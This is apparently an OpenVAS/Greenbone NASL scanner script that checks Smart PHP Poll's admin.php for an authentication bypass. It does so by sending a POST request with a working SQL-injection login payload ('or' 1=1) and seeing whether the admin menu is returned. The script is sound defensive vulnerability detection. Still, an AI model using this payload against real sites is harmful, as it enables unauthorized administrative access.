# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805506");
  script_version("2023-12-13T05:05:23+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2015-03-17 15:24:03 +0530 (Tue, 17 Mar 2015)");
  script_name("Smart PHP Poll Authentication Bypass Vulnerability");

  script_tag(name:"summary", value:"Smart PHP Poll is prone to an authentication bypass vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to bypass authentication oe not.");

  script_tag(name:"insight", value:"The flaw exists due to inadequate
  validation of input passed via POST parameters 'admin_id' and 'admin_pass'
  to admin.php script");

  script_tag(name:"impact", value:"Successful exploitation will allow
  remote attackers to bypass the authentication.");

  script_tag(name:"affected", value:"Smart PHP Poll");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"exploit");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/36386");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

http_port = http_get_port(default:80);
if(!http_can_host_php(port:http_port)){
  exit(0);
}

host = http_host_name( port:http_port );

foreach dir (make_list_unique("/", "/smart_php_poll", "/poll", http_cgi_dirs( port:http_port ) ) ) {

  if( dir == "/" ) dir = "";

  url = dir + "/admin.php";
  rcvRes = http_get_cache(item:url, port:http_port);

  if (rcvRes && rcvRes =~ ">Smart PHP Poll.*Administration Panel<")
  {
    postData = "admin_id=admin+%27or%27+1%3D1&admin_pass=admin+%27or%27+1%3D1";

    #Send Attack Request
    sndReq = string("POST ", url, " HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "Content-Type: application/x-www-form-urlencoded","\r\n",
                    "Content-Length: ", strlen(postData), "\r\n\r\n",
                    postData);
    rcvRes = http_send_recv(port:http_port, data:sndReq);

    if(rcvRes && ">Main Menu<" >< rcvRes && ">Logout<" >< rcvRes
              && ">Smart PHP Poll" >< rcvRes)
    {
      security_message(port:http_port);
      exit(0);
    }
  }
}

exit(99);
